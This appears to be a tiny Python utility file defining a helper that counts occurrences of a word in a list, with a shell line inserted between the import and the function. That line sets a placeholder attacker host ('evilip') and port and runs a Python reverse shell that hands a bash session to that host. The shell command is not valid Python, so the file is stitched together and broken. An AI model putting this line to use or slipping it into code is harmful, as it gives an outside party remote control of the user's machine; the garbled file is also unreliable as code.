from collections import Counter

export RHOST="evilip";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

def count_in_list(l, word):
    c = Counter(l)
    return c[word]
